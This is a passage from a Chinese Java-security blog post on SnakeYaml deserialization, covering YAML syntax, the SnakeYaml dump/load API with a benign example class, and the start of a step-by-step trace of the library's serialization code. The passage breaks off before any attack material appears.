2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item title" href="/2025/04/30/CTF/2025%20ACTF%20Web%20WP/"><span class="title">2025 ACTF Web 复现</span></a><a class="item title" href="/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F01-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"><span class="title">内网渗透 01 - 端口转发</span></a><a class="item title" href="/2024/09/18/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - Fastjson 反序列化</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    
+<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Java-%E5%AE%89%E5%85%A8/">Java 安全</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-05-17T15:57:00.988Z">2025-05-17</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-05-17T15:59:41.701Z">2025-05-17</time></span></div></div>
+</div>
+
+    
+    <div class="bottom">
+      <div class="text-area">
+        <h1 class="text title"><span>漏洞篇 - SnakeYaml 反序列化</span></h1>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h2 id="SnakeYaml-反序列化"><a href="#SnakeYaml-反序列化" class="headerlink" title="SnakeYaml 反序列化"></a>SnakeYaml 反序列化</h2><p>又来炒冷饭了伙计们。</p>
+<h2 id="一、SnakeYaml-简介"><a href="#一、SnakeYaml-简介" class="headerlink" title="一、SnakeYaml 简介"></a>一、SnakeYaml 简介</h2><p>SnakeYaml 是 Java 中解析 yaml 的库，而 yaml 是一种人类可读的数据序列化语言，通常用于编写配置文件等。</p>
+<p>YAML 的语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（例如：许多电子邮件标题格式和 YAML 非常接近）。</p>
+<h3 id="0x1：yaml-基本语法"><a href="#0x1：yaml-基本语法" class="headerlink" title="0x1：yaml 基本语法"></a>0x1：yaml 基本语法</h3><ul>
+<li><p>大小写敏感</p>
+</li>
+<li><p>使用缩进表示层级关系</p>
+</li>
+<li><p>缩进只允许使用空格</p>
+</li>
+<li><p><code>#</code>​ 表示注释</p>
+</li>
+<li><p>支持对象、数组、纯量这 3 种数据结构</p>
+<ul>
+<li>对象：键值对的集合，又称为映射（mapping）&#x2F; 哈希（hashes） &#x2F; 字典（dictionary）</li>
+<li>数组：一组按次序排列的值，又称为序列（sequence） &#x2F; 列表（list）</li>
+<li>纯量（scalars）：单个的、不可再分的值</li>
+</ul>
+</li>
+</ul>
+<p>YAML 的配置文件后缀为 .yml，如：runoob.yml 。</p>
+<h4 id="1、yaml-对象"><a href="#1、yaml-对象" class="headerlink" title="1、yaml 对象"></a>1、yaml 对象</h4><p>对象键值对使用冒号结构表示 key: value，冒号后面要加一个空格。</p>
+<p>也可以使用 key:{key1: value1, key2: value2, …}。</p>
+<p>还可以使用缩进表示层级关系；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key: </span><br><span class="line">    child-key: value</span><br><span class="line">    child-key2: value2</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、yaml-数组"><a href="#2、yaml-数组" class="headerlink" title="2、yaml 数组"></a>2、yaml 数组</h4><p>以 - 开头的行表示构成一个数组：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- A</span><br><span class="line">- B</span><br><span class="line">- C</span><br></pre></td></tr></table></figure>
+
+<p>一个相对复杂的例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">companies:</span><br><span class="line">    -</span><br><span class="line">        id: 1</span><br><span class="line">        name: company1</span><br><span class="line">        price: 200W</span><br><span class="line">    -</span><br><span class="line">        id: 2</span><br><span class="line">        name: company2</span><br><span class="line">        price: 500W</span><br></pre></td></tr></table></figure>
+
+<p>意思是 companies 属性是一个数组，每一个数组元素又是由 id、name、price 三个属性构成。</p>
+<p>数组也可以使用流式(flow)的方式表示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">companies: [&#123;id: 1,name: company1,price: 200W&#125;,&#123;id: 2,name: company2,price: 500W&#125;]</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、复合结构"><a href="#3、复合结构" class="headerlink" title="3、复合结构"></a>3、复合结构</h4><p>数组和对象可以构成复合结构，例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">languages:</span><br><span class="line">  - Ruby</span><br><span class="line">  - Perl</span><br><span class="line">  - Python </span><br><span class="line">websites:</span><br><span class="line">  YAML: yaml.org </span><br><span class="line">  Ruby: ruby-lang.org </span><br><span class="line">  Python: python.org </span><br><span class="line">  Perl: use.perl.org</span><br></pre></td></tr></table></figure>
+
+<h4 id="4、纯量"><a href="#4、纯量" class="headerlink" title="4、纯量"></a>4、纯量</h4><p>纯量是最基本的，不可再分的值，包括：</p>
+<ul>
+<li>字符串</li>
+<li>布尔值</li>
+<li>整数</li>
+<li>浮点数</li>
+<li>Null</li>
+<li>时间</li>
+<li>日期</li>
+</ul>
+<p>使用一个例子来快速了解纯量的基本使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">boolean: </span><br><span class="line">    - TRUE  #true,True都可以</span><br><span class="line">    - FALSE  #false，False都可以</span><br><span class="line">float:</span><br><span class="line">    - 3.14</span><br><span class="line">    - 6.8523015e+5  #可以使用科学计数法</span><br><span class="line">int:</span><br><span class="line">    - 123</span><br><span class="line">    - 0b1010_0111_0100_1010_1110    #二进制表示</span><br><span class="line">null:</span><br><span class="line">    nodeName: &#x27;node&#x27;</span><br><span class="line">    parent: ~  #使用~表示null</span><br><span class="line">string:</span><br><span class="line">    - 哈哈</span><br><span class="line">    - &#x27;Hello world&#x27;  #可以使用双引号或者单引号包裹特殊字符</span><br><span class="line">    - newline</span><br><span class="line">      newline2    #字符串可以拆成多行，每一行会被转化成一个空格</span><br><span class="line">date:</span><br><span class="line">    - 2018-02-17    #日期必须使用ISO 8601格式，即yyyy-MM-dd</span><br><span class="line">datetime: </span><br><span class="line">    -  2018-02-17T15:02:31+08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><br></pre></td></tr></table></figure>
+
+<h4 id="5、引用"><a href="#5、引用" class="headerlink" title="5、引用"></a>5、引用</h4><p>&amp; 锚点和 * 别名，可以用来引用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">defaults: &amp;defaults</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  database: myapp_development</span><br><span class="line">  &lt;&lt;: *defaults</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">  database: myapp_test</span><br><span class="line">  &lt;&lt;: *defaults</span><br></pre></td></tr></table></figure>
+
+<p>上面.yaml 文件相当于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">defaults:</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  database: myapp_development</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">  database: myapp_test</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br></pre></td></tr></table></figure>
+
+<p>&amp; 用来建立锚点（defaults），&lt;&lt; 表示合并到当前数据，* 用来引用锚点。</p>
+<p>参考链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.runoob.com/w3cnote/yaml-intro.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x2-序列化和反序列化函数"><a href="#0x2-序列化和反序列化函数" class="headerlink" title="0x2 序列化和反序列化函数"></a>0x2 序列化和反序列化函数</h3><p>snakeyaml 中有以下序列化和反序列化函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">String  dump(Object data)</span><br><span class="line">将Java对象序列化为YAML字符串。</span><br><span class="line">void    dump(Object data, Writer output)</span><br><span class="line">将Java对象序列化为YAML流。</span><br><span class="line">String  dumpAll(Iterator&lt;? extends Object&gt; data)</span><br><span class="line">将一系列Java对象序列化为YAML字符串。</span><br><span class="line">void    dumpAll(Iterator&lt;? extends Object&gt; data, Writer output)</span><br><span class="line">将一系列Java对象序列化为YAML流。</span><br><span class="line">String  dumpAs(Object data, Tag rootTag, DumperOptions.FlowStyle flowStyle)</span><br><span class="line">将Java对象序列化为YAML字符串。</span><br><span class="line">String  dumpAsMap(Object data)</span><br><span class="line">将Java对象序列化为YAML字符串。</span><br><span class="line"></span><br><span class="line">&lt;T&gt; T   load(InputStream io)</span><br><span class="line">解析流中唯一的YAML文档，并生成相应的Java对象。</span><br><span class="line">&lt;T&gt; T   load(Reader io)</span><br><span class="line">解析流中唯一的YAML文档，并生成相应的Java对象。</span><br><span class="line">&lt;T&gt; T   load(String yaml)</span><br><span class="line">解析字符串中唯一的YAML文档，并生成相应的Java对象。</span><br><span class="line">Iterable&lt;Object&gt;    loadAll(InputStream yaml)</span><br><span class="line">解析流中的所有YAML文档，并生成相应的Java对象。</span><br><span class="line">Iterable&lt;Object&gt;    loadAll(Reader yaml)</span><br><span class="line">解析字符串中的所有YAML文档，并生成相应的Java对象。</span><br><span class="line">Iterable&lt;Object&gt;    loadAll(String yaml)</span><br><span class="line">解析字符串中的所有YAML文档，并生成相应的Java对象。</span><br></pre></td></tr></table></figure>
+
+<p>其中比较常用的就是 Yaml.dump() 和 Yaml.load() 。</p>
+<p>‍</p>
+<h2 id="二、SnakeYaml-快速入门"><a href="#二、SnakeYaml-快速入门" class="headerlink" title="二、SnakeYaml 快速入门"></a>二、<strong>SnakeYaml 快速入门</strong></h2><p>SnakeYaml 提供了 yaml 数据和 Java 对象相互转换的 API，即能够对数据进行序列化与反序列化。</p>
+<ul>
+<li>Yaml.load()：将 yaml 数据反序列化成一个 Java 对象。</li>
+<li>Yaml.dump()：将 Java 对象序列化成 yaml 。</li>
+</ul>
+<p>依赖导入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;org.yaml&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;1.27&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用于序列化的 Person 类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public class Person &#123;</span><br><span class="line">    private String username;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public Person() &#123;</span><br><span class="line">        System.out.println(&quot;无参构造方法被执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Person(String username, int age) &#123;</span><br><span class="line">        this.username = username;</span><br><span class="line">        this.age = age;</span><br><span class="line">        System.out.println(&quot;有参构造方法被执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        System.out.println(&quot;getAge方法调用&quot;);</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getUsername() &#123;</span><br><span class="line">        System.out.println(&quot;getUsername方法调用&quot;);</span><br><span class="line">        return username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        System.out.println(&quot;setAge方法调用&quot;);</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setUsername(String username) &#123;</span><br><span class="line">        System.out.println(&quot;setUsername方法调用&quot;);</span><br><span class="line">        this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试序列化与反序列化，SnakeYamlTest.java：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line">public class SnakeYamlTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Yaml yaml = new Yaml();</span><br><span class="line">        Person person = new Person(&quot;mike&quot;, 18);</span><br><span class="line">        System.out.println(&quot;序列化&quot;);</span><br><span class="line">        String str = yaml.dump(person);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        System.out.println(&quot;反序列化&quot;);</span><br><span class="line">        Person person2 = yaml.load(str);</span><br><span class="line">        System.out.println(person2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250422225618-o5mnsu3.png">
+
+<p>参考链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://chenergy1991.github.io/2019/04/27/yaml.load%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、原理分析"><a href="#三、原理分析" class="headerlink" title="三、原理分析"></a>三、原理分析</h2><h3 id="0x1-序列化分析"><a href="#0x1-序列化分析" class="headerlink" title="0x1 序列化分析"></a>0x1 序列化分析</h3><p>关注 yaml.dump 方法，在这里下断点开始调试：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424160304-qprjtu9.png">
+
+<p>跟进 Yaml#dump(Object) ，这里将 data 封装进 ArrayList 列表中，再调用 dumpAll 方法进行处理，提高 dumpAll 方法的复用性：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424160949-baouee6.png">
+
+<p>继续跟进 Yaml#dumpAll(Iterator&lt;? extends Object&gt;)，这里调用重构方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424161427-1srh3y1.png">
+
+<p>跟进 Yaml#dumpAll(Iterator&lt;? extends Object&gt;, Writer, Tag) ，这里先获取了一个序列化器 serializer ，先调用了 serializer.open() 、然后对于迭代器中的每一个数据 data ，都调用 representer.represent 来获取 node ，并且调用 serializer.serialize 进行序列化，最后调用 serializer.close() 收尾 ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424161821-4ha3jog.png">
+
+<p>那么首先来看 Serializer 的构造，给属性赋值，没什么好说的：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424162335-j8e3ibj.png">
+
+<p>接下来看 serializer.open() ，这里用 this.closed 来控制生命周期，开始时将其设置为 false ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424162551-frlmau3.png">
+
+<p>结束时调用 serializer.close() 将其设置为 true ，表示关闭：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424162708-tmx1ws0.png">
+
+<p>接下来看关键方法，BaseRepresenter#represent(Object) 这个方法用于将 Java 对象转换为 Yaml node 节点，其核心是调用了内部的 representData 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424162853-9afu12g.png">
+
+<p>跟进 BaseRepresenter#representData(Object) ，简单解释一下，它用来获取一个对象的表示数据</p>
+<p>1、首先会去 representedObjects 属性中查找 data 是否已存在（是否已经获取过 node 节点），有的话直接获取返回。这也是一种缓存机制，防止重复获取；</p>
+<p>2、对空数据单独处理；</p>
+<p>3、然后调用 data.getClass() 来获取对应的类型，data 此时是 Person 对象，获取到的自然是 Person 的 class 对象。</p>
+<p>4、获取完以后去 representers 属性中找是否已存在该键，如果存在，直接去 representers 属性中获取对应的 Represent 对象，还是缓存。如果不存在，则去 multiRepresenters 属性中获取父类处理器的 Represent 对象。最后调用 Represent 对象的 representData 方法获取 node 节点 。</p>
+<p>5、最后还有针对其他情况的默认处理逻辑，即既不为空，也没有当前类和父类对应的 Represent 对象 ，就是从 multiRepresenters 中获取 null 键对应的 Represent 对象，或者去 representers 中获取 null 键对应的 Represent 对象（我们的调试最终是跟到了这里），最后也是调用 Represent 对象的 representData 方法获取 node 节点：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424163609-tv4j5j4.png">
+
+<p>那么我们跟进 Representer$RepresentJavaBean#representData(Object)，这里首先调 getProperties 获取了一些什么配置，再将它和 data 一起作为参数传入 representJavaBean 方法中：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424170706-aluk348.png">
+
+<p>跟进 Representer#getProperties(Class&lt;? extends Object&gt;) ，还是一样先去 typeDefinitions 里找现成的 PropertyUtils ，找不到就调用 getPropertyUtils() 获取一个。最后调用 PropertyUtils.getProperties ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424170843-ldpq9sg.png">
+
+<p>继续跟进 PropertyUtils#getProperties(Class&lt;? extends Object&gt;)， 调用两参重构方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424171407-7legtwr.png">
+
+<p>继续跟进 PropertyUtils#getProperties(Class&lt;? extends Object&gt;, BeanAccess)，这里就干了两件事，一个 Set 集合 properties ，一个 Map 集合 readableProperties 。readableProperties 是缓存，我们只关注 createPropertySet 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424171536-hfmmwwp.png">
+
+<p>跟进 PropertyUtils#createPropertySet(Class&lt;? extends Object&gt;, BeanAccess) ，new 一个 TreeSet ，然后将可读可写、或者只读的配置添加到其中，而这些配置则是通过调用 getPropertiesMap 获取的：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424172114-k8xgf3t.png">
+
+<p>那么关键之处就在于这个 PropertyUtils#getPropertiesMap(Class&lt;?&gt;, BeanAccess) ，跟进它 ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250424172445-pop7j3k.png">
+
+<p>1、首先，方法接收两个参数：Class 类型和 BeanAccess 枚举。方法内部首先检查 propertiesCache 缓存中是否已经存在该类型的属性映射。如果存在，直接返回缓存的值，这样可以提高性能，避免重复计算。</p>
+<p>2、如果缓存中没有，就创建一个新的 LinkedHashMap 来存储属性。接着根据 BeanAccess 的不同分支处理：</p>
+<pre><code>（1）当 BeanAccess 是 FIELD 模式时，通过反射获取类的所有字段（排除 static 和 transient 字段），并加入到 properties 中，并且 properties 当中字段对应的值是 FieldProperty 。
+
+（2）当 BeanAccess 是默认模式（非 FIELD）时，第一步通过 Introspector.getBeanInfo(type).getPropertyDescriptors() 获取类的描述信息（包含类的所有方法、字段等信息）。这里关于 Introspector.getBeanInfo(type).getPropertyDescriptors() 我还得再解释一下，它只会返回有 getter 或 setter 的字段，如果一个字段既没有 getter 也没有 setter ，是不会被返回的。比如我们在 Person 类中添加以下字段：  
+</code></pre>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250502142918-9h8s8pj.png">
+
